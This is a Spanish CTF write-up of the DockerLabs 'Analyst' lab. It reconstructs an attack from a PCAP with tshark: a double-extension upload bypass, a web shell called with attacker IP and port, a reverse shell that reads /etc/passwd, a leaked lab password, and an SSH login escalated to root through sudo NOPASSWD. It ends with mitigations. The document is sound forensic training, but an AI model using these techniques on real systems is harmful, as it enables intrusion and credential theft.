# Analyst

> Análisis forense de red al estilo SOC: a partir de una captura PCAP reconstruyo toda la cadena de ataque —reconocimiento, bypass de subida por doble extensión, web shell, reverse shell y fuga de credenciales— con tshark, respondo las 9 preguntas del caso y termino escalando a root con la credencial filtrada.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH), 80/tcp (HTTP) |
| **Saltos de usuario** | 1 |

**Tags:** `Forense` · `Wireshark` · `tshark` · `PCAP` · `SOC` · `Doble extensión` · `sudo` · `Blue Team`

---

## El caso · ticket SOC

Esta máquina es distinta: no se trata de vulnerar un servicio en vivo, sino de un análisis forense de red como los que se hacen en un SOC. La web del 80 me presenta un ticket de incidente —**SOC-LAB // TICKET #PGN-2026-0417 · 'El caso de Pinguinito'**— y dos evidencias para descargar: `incidente_pinguino.pcap` (la captura del segmento comprometido) y `threat_intel_feed.json` (un feed de threat intelligence con atribución de IPs). El objetivo es reconstruir la cadena de ataque desde el PCAP y responder 9 preguntas.

> **Nota.** Las IPs del caso — Servidor víctima: 10.10.2.15 · Atacante real (Vietnam): 198.51.100.23 · Escáner / ruido de fondo (Alemania): 203.0.113.99 · Máquina DockerLabs (SSH final): 172.17.0.2.

## Preparando el análisis · tshark

Se puede abrir el .pcap con Wireshark, pero lo hago con tshark, que es el mismo motor por línea de comandos: perfecto para filtrar rápido, encadenar con grep/sort y dejar constancia reproducible.

> **Nota.** tshark en 30 segundos — `-r fichero.pcap` lee una captura guardada · `-Y 'filtro'` aplica un filtro de visualización (misma sintaxis que Wireshark) · `-T fields -e campo` saca solo los campos que te interesan · `-z follow,tcp,ascii,N` reconstruye el contenido del flujo TCP nº N.

## Q1 y Q2 · el origen del ataque

El caso empieza por la subida del archivo malicioso, así que filtro las peticiones POST: son las que suben datos. Solo una IP las hace.

```bash
$ tshark -r incidente_pinguino.pcap -Y 'http.request.method=="POST"' -T fields -e ip.src -e http.request.uri
198.51.100.23   /reviews/upload.php
198.51.100.23   /reviews/upload.php
```

Hay otras IPs en la captura (por ejemplo un escáner alemán), pero solo **198.51.100.23** llega a subir algo. Es el atacante real. Lo cruzo con el feed de threat intel.

```bash
$ jq '.entries[] | select(.ip=="198.51.100.23") | {ip, country, city}' threat_intel_feed.json
{
  "ip": "198.51.100.23",
  "country": "Vietnam",
  "city": "Hanoi"
}
```

> **Nota.** Respuesta 1 — IP del atacante: 198.51.100.23. · Respuesta 2 — Atribución: Vietnam.

## Q3 y Q4 · huella y endpoint

```bash
$ tshark -r incidente_pinguino.pcap -Y 'ip.src==198.51.100.23 && http.request' -T fields -e http.user_agent | sort -u
Mozilla/5.0 (compatible; ReconBot/1.0; +http://lab.invalid/reconbot)
```

> **Nota.** Respuesta 3 — User-Agent: Mozilla/5.0 (compatible; ReconBot/1.0; +http://lab.invalid/reconbot). · Respuesta 4 — Endpoint de subida: /reviews/upload.php.

## Q5 y Q6 · directorio y archivo malicioso

Antes de subir nada, el atacante prueba varias rutas con GET hasta dar con el directorio de subidas real.

```bash
$ tshark -r incidente_pinguino.pcap -Y 'ip.src==198.51.100.23 && http.request.method=="GET"' -T fields -e http.request.uri
/uploads/
/images/uploads/
/media/uploads/
/reviews/uploads/
/reviews/uploads/image.jpg.php?ip=198.51.100.23&port=8080
```

La única ruta sobre la que el ataque continúa es `/reviews/uploads/` (devuelve 200 OK; las otras tres, 404). Ahí aparece subido y ejecutándose el archivo malicioso. Comparo los dos intentos de subida siguiendo sus flujos TCP.

```bash
$ tshark -r incidente_pinguino.pcap -q -z follow,tcp,ascii,10
filename="shell.php"
...
HTTP/1.1 403 Forbidden
Tipo de archivo no permitido (extension .php bloqueada)

$ tshark -r incidente_pinguino.pcap -q -z follow,tcp,ascii,11
filename="image.jpg.php"
...
HTTP/1.1 200 OK
Archivo subido correctamente: /reviews/uploads/image.jpg.php
```

> **Nota.** El bypass de doble extensión: el filtro rechaza `shell.php`, pero deja pasar `image.jpg.php` porque se fía del `.jpg` intermedio. Como Apache ejecuta cualquier fichero acabado en `.php`, el archivo se interpreta como código → web shell. · Respuesta 5 — /reviews/uploads/ · Respuesta 6 — image.jpg.php.

## Q7, Q8 y Q9 · reverse shell y fuga de credenciales

El web shell abre una conexión saliente desde el servidor hacia el atacante. La localizo buscando el SYN inicial que sale de la víctima.

```bash
$ tshark -r incidente_pinguino.pcap -Y 'ip.src==10.10.2.15 && ip.dst==198.51.100.23 && tcp.flags.syn==1 && tcp.flags.ack==0' -T fields -e tcp.dstport
8080
```

Sigo ese flujo TCP para leer la sesión de la shell inversa, donde quedan grabados los comandos del atacante.

```bash
$ tshark -r incidente_pinguino.pcap -q -z follow,tcp,ascii,13
sudo -l
    (ALL) NOPASSWD: /opt/scripts/reset_user_pass.sh
sudo /opt/scripts/reset_user_pass.sh pinguinito
[reset_user_pass] Nueva contrasena establecida: Tr0pic4l-Pingu_99!
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
pinguinito:x:1001:1001:Pinguinito,,,:/home/pinguinito:/bin/bash
```

> **Nota.** Respuesta 7 — Puerto de la reverse shell: 8080. · Respuesta 8 — Fichero leído con cat: /etc/passwd. · Respuesta 9 — Usuario afectado: pinguinito (credencial filtrada: pinguinito : Tr0pic4l-Pingu_99!).

## Del análisis al root

El forense me ha regalado unas credenciales válidas. Las uso para entrar de verdad en la máquina por SSH.

```bash
$ ssh pinguinito@172.17.0.2
pinguinito@172.17.0.2's password: (Tr0pic4l-Pingu_99!)
pinguinito@0e1369cb67ea:~$ sudo -l
User pinguinito may run the following commands:
    (ALL) NOPASSWD: ALL
```

`NOPASSWD: ALL` es la escalada más directa que existe: pinguinito puede ejecutar cualquier comando como root sin contraseña.

```bash
$ sudo su
root@0e1369cb67ea:/home/pinguinito# whoami
root
```

Caso cerrado: cadena de ataque reconstruida y máquina comprometida como root.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Subida de ficheros sin validar (bypass por doble extensión)

`CWE-434` · A04:2021 – Insecure Design

**Impacto.** El filtro de extensiones se salta con image.jpg.php; el atacante sube una web shell y consigue ejecución remota de código en el servidor.

**Mitigación.** Validar el tipo real del fichero (magic bytes), usar lista blanca de extensiones, renombrar al guardar y no permitir ejecución en el directorio de subidas.

### 🔴 CRÍTICA — Escalada a root por sudo NOPASSWD sin restricción

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** www-data puede ejecutar un script privilegiado y el usuario pinguinito tiene NOPASSWD: ALL, lo que lleva a root de forma inmediata.

**Mitigación.** Aplicar el principio de mínimo privilegio en sudoers; restringir comandos concretos y nunca conceder NOPASSWD: ALL.

### 🟡 MEDIA — Exposición de credenciales en texto claro

`CWE-312` · A02:2021 – Cryptographic Failures

**Impacto.** El script de mantenimiento imprime la nueva contraseña de pinguinito en claro, quedando visible en el tráfico/registros capturados.

**Mitigación.** Nunca registrar ni mostrar secretos en stdout o logs; usar generación y entrega segura de credenciales y forzar su cambio en el primer uso.

---

_Writeup de **Analyst** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
